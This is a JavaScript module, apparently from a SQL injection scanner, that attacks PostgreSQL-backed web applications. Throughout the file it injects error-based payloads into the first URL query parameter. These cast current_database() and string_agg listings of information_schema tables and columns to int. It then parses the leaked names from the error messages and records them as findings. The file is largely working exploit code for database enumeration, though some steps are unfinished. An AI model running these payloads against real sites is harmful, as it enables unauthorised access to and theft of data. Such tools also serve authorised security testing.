import { printInfo, printSuccess } from "./logger.js";
import { sendRequest } from "./http.js";
import { mutateQuery } from "./helper.js";
import { dbSaveDbName, dbSaveScan, dbSaveVulnerability } from "./database.js";

export function testPostgresql(setting) {
	printInfo("Running POSTGRESQL test suite");

	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	const dbNameId = getDatabaseName(setting, query, firstParamsName, firstParamsValue, c);
	getTableName(setting, query, firstParamsName, firstParamsValue, c, dbNameId);
	// getColumnName(setting, query, firstParamsName, firstParamsValue, c);
}

async function getDatabaseName(setting, query, name, valueBase, c) {
	const injection = " AND 1=CAST(current_database() AS int)-- 42";
	const payload = `${valueBase}${c}${injection}`;
	const params = mutateQuery(query, name, payload);
	const res = await sendRequest(setting, params);
	const nameList = parseBody(res.body);
	printSuccess(`Database name: ${nameList}`);

	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const dbNameId = dbSaveDbName(setting.db, setting.scanId, nameList[0]);

	return dbNameId;
}

async function getTableName(setting, query, name, valueBase, c, dbNameId) {
	const injection = " AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)-- 42";
	const res = await sendRequest(setting, mutateQuery(query, name, `${valueBase}${c}${injection}`));
	const nameList = parseBody(res.body);
	printSuccess(`Database tables: ${nameList}`);
	// save tableName
}

async function getColumnName(setting, query, name, valueBase, c) {
	// get list of tableName stored in db
	const tableNames = [];
	for (const tableName of tableNames) {
		const injection = ` AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='${tableName}') AS int)-- 42`;
		const res = await sendRequest(setting, mutateQuery(query, name, `${valueBase}${c}${injection}`));
		const nameList = parseBody(res.body);
		// save ColumnName
	}
}

function parseBody(body) {
	const match = body.match(/type integer: \\?"(.*?)\\?"/);
    return match ? match[1].split(',') : [];
}
